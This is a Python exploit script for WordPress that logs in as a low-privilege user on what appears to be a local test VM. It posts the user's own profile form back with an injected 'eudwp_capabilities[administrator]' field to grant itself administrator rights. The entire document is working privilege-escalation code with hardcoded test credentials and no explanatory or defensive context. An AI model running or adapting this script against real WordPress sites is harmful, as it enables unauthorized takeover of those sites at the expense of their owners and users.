import requests
from bs4 import BeautifulSoup
 
baseUrl = 'http://wpdistillery.vm'
loginUrl = baseUrl + '/wp-login.php'
profileUrl = baseUrl + '/wp-admin/profile.php'
 
loginPostData = {
    'log': 'test1',
    'pwd': 'asdqwezxc',
    'rememberme': 'forever',
    'wp-submit': 'Log+In'
}
 
s = requests.Session()
 
r = s.post(loginUrl, loginPostData)
 
if r.status_code != 200:
    print('Login error')
    exit(1)
 
r = s.get(profileUrl)
soup = BeautifulSoup(r.text, 'html.parser')
 
f = soup.find('form', {'id': 'your-profile'})
if not f:
    print('Error')
    exit(1)
 
data = {
    'eudwp_capabilities[administrator]': 1,
}
 
for i in f.find_all('input'):
    if 'name' in i.attrs and 'value' in i.attrs and i.attrs['value']:
        data[i.attrs['name']] = i.attrs['value']
 
r = s.post(profileUrl, data)
 
if r.status_code == 200:
    print('Success')
 
exit(0)
